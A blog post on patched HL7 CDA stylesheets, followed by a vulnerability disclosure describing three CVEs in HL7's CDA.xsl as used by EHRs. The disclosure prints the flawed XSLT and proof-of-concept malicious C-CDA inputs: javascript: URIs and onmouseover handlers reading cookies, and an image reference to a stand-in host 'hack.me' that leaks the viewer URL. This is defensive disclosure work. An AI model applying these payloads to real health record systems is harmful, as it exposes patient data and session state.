### [HL7 CDA Stylesheet Patches](https://motorcycleguy.blogspot.com/2014/04/hl7-cda-stylesheet-patches.html)

A few weeks ago, Josh Mandel identified problems with the sample CDA Stylesheet that is released with C-CDA Release 1.1 and several other editions of the CDA Standard and various implementation guides. There are some 30 variants of the stylesheet in various HL7 standards and guides.  A patched version of the file has been created and is now available from HL7's GForge site [here](http://gforge.hl7.org/gf/project/strucdoc/frs/?action=FrsReleaseBrowse&frs_package_id=239).

Both the TSC and the HL7 Board are still discussing how to address this from an organizational perspective, and the Structured Documents Workgroup is currently considering how to address these sorts of tools that are released in the future.  Thanks very much to Rick Geimer of Lantana Group for his extensive work on the patched stylesheet (and to his children for putting up with this over the weekend).

   One of the major things I'm always missing is l10n in that XSL. After translating about 5 versions I decided to go a different route. I gathered the translated versions in 5 languages, and scraped the label out of there and externalized those into an l10n file. I replaced every occurrence of fixed text with a call to that file and made sure English is fallback. Result is that any person looking at an English document (languageCode) will see what they always saw, and someone looking at a German (de-DE, de-CH) or Dutch (nl-NL, nl-BE) will see it rendered in their native language. It responds to ClinicalDocument.languageCode by default, but it may be fixed to be 1 language.

   While at it I translated most known OIDs, LOINC codes for CDA, HL7 code systems and then some. I added a feature request at GForge, but it does not allow me to upload the XSL which has been in production use for a couple of years now.

   It's fully annotated and updated with the patches submitted in GForge. You may find the work here: https://decor.nictiz.nl/CDA/

   Is this still the latest CDA stylesheet?

     Yes ... but, you probably want to use the work produced externally and submitted to the ONC/HL7 Stylesheet Competition.

   Is there a stylesheet for CCRs?

   Does this stylesheet includes view of privacy disclosure ?

# Security vulnerabilities in C-CDA Display using CDA.xsl

*TL;DR: If you’re using XSLT stylesheets to render C-CDAs in your EHR, make sure you understand the security implications. Otherwise you could be vulnerable to a data breach.*

This blog post describes **security issues that have affected well-known 2014 Certified EHRs.**. Please note that I’ve already shared this information privately with the Web-based EHR vendors I could identify, and I’ve waited until they were able to investigate the issues and (if needed) repair their systems.

Last month I observed a set of security vulnerabilities in XSLT “stylesheets” used to display externally-supplied C-CDA documents in many EHRs. To be specific: **the CDA.xsl stylesheet provided by HL7 (which has been adopted by many EHR vendors) can leave EHRs vulnerable to attacks by maliciously-composed documents.**

I plan to follow up with posts describing:

* [a real-world case where a vendor was affected by these and related issues](http://smarthealthit.org/2014/04/case-study-security-vulnerabilities-in-ccda/)
* a set of security best practices that can help avoid these and other issues
* [the unfortunate state of EHR vendor security vulnerability reporting protocols](http://smarthealthit.org/2014/04/ehr-security-vulnerability-reporting)

# Three fundamental attacks

Many vendors appear to be using (slightly tweaked versions of) the [CDA.xsl](http://github.com/chb/sample_ccdas/blob/master/CDA.xsl) that comes with HL7’s C-CDA release. This provides potential attackers with a highly visible, leveragable target.

My analysis revealed *at least three ways to craft a malicious C-CDA*. The first two vulnerabilities allow the execution of arbitrary JavaScript code within the C-CDA viewer. For example, **an attacker could steal browser cookies and application state, and post them back to an external server**. The third vulnerability allows the C-CDA viewer URL to leak to an external server.

## 1. Unsanitized `nonXMLBody/text/reference/@value` can execute JavaScript

### CVE-2014-3861

One opportunity for injection attacks is the default handling of a `nonXMLBody` CDA.

```
<xsl:template match='n1:component/n1:nonXMLBody'>
  <xsl:choose>
  <!-- if there is a reference, use that in an IFRAME -->
  <xsl:when test='n1:text/n1:reference'>
  <IFRAME name='nonXMLBody' id='nonXMLBody' WIDTH='80%' HEIGHT='600' src='{n1:text/n1:reference/@value}' />
</xsl:when>

```

This means an attacker can execute arsbitrary JavaScript by supplying a reference like:

```
<nonXMLBody>
  <text>
    <reference value="javascript:alert(parent.document.cookie);"/>
  </text>
</nonXMLBody>

```

The XSLT-output HTML rendering would include the following dangerous snippet:

```
  <iframe src="javascript:alert(parent.document.cookie);"></iframe>

```
## 2. Unsanitized `table/@onmouseover` can execute JavaScript

### CVE-2014-5452

A valid C-CDA document is not allowed to provide `table/@onmouseover` attributes. But if invalid documents are allowed into a system, then the following permissive “copy all” can be dangerous:

```
<!-- Tables -->
<xsl:template
  match="n1:table/@*|n1:thead/@*|n1:tfoot/@*|n1:tbody/@*|n1:colgroup/@*|n1:col/@*|n1:tr/@*|n1:th/@*|n1:td/@*">
  <xsl:copy>
    <xsl:copy-of select="@*" />
    <xsl:apply-templates />
  </xsl:copy>

```

What this says is: “when you find a `table` in the C-CDA document, just copy all of its XML attributes right into the rendered document.” An attacker can use this to inject JavaScript in the resulting document. For example, an attacker could steal cookies and application state, and post them back to an external server.

A source C-CDA document would supply a table like:

```
<table
   onmouseover="alert(document.cookie);"
   style="height: 100%; width: 100%; position: fixed; left: 0px; top: 0px;">
</table>

```

… and the XSLT-output HTML rendering would contain the source `table` element verbatim.

## 3. Unsanitized `observationMedia/value/reference/@value` can leak state via HTTP `Referer` headers

### CVE-2014-3862

Searching CDA.xsl for the term `img`, reveals two places where image tags are emitted. Both occur within the `renderMultiMedia`template definition:

```
<xsl:template match="n1:renderMultiMedia">
  <xsl:variable name="imageRef" select="@referencedObject" />
      <!-- snipped for brevity -->
      <xsl:if
        test="//n1:observationMedia[@ID=$imageRef]/n1:value[@mediaType='image/gif' or @mediaType='image/jpeg']">
        <br clear="all" />
        <xsl:element name="img">
          <xsl:attribute name="src"><xsl:value-of
              select="//n1:observationMedia[@ID=$imageRef]/n1:value/n1:reference/@value" /></xsl:attribute>
        </xsl:element>
      </xsl:if>
      <!-- snipped for brevity -->
</xsl:template>

```

By constructing an appropriate `section` in a C-CDA document to act as input to the template above, an attacker can cause the browser to leak the current page URL to `http://hack.me`:

```
<text>
  This image loads from an external server...
  <renderMultiMedia referencedObject="MM1"></renderMultiMedia>
</text>
<entry>
  <observationMedia ID="MM1">
    <id root="10.23.4567.345"/>
    <value xsi:type="ED" mediaType="image/jpeg">
      <reference value="http://hack.me/leaked-from-image.png"/>
    </value>
  </observationMedia>
</entry>

```

The XSLT-output HTML rendering would include the potentially dangerous snippet:

```
<img src="http://hack.me/leaked-from-image.png"></img>

```

Each time the document is viewed, the browser sends an HTTP `Referer` header to `hack.me` that inclues the source page URL. This can be dangerous if any private session state is embedded in that URL.
